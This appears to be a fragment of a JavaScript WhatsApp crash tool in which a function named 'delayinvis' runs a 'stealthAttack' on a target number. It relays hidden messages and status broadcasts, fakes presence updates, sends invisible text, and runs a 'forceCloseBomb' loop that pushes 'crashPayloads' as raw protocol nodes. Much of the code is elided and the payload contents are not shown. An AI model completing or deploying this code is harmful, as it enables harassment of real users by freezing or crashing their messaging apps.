// delay.js
async function delayinvis(rizkyyy, target) {
  ...
  const stealthAttack = async (count = 0) => {
    ...
    try {
      ...
      await rizkyyy.relayMessage(target, cleanMsg.message, {
        messageId: cleanMsg.key.id,
        participant: { jid: target }
      });
      
      await rizkyyy.relayMessage("status@broadcast", statusMsg.message, {
      ...
      const stealthTyping = async () => {
        for (let i = 0; i < 3; i++) {
          await rizkyyy.sendPresenceUpdate('available', target);
      ...
      await rizkyyy.sendMessage(target, invisibleText, {
        quoted: null
      });
  ...
  const forceCloseBomb = async () => {
    ...
    for (const payload of crashPayloads) {
      try {
        await rizkyyy.sendNode(payload);
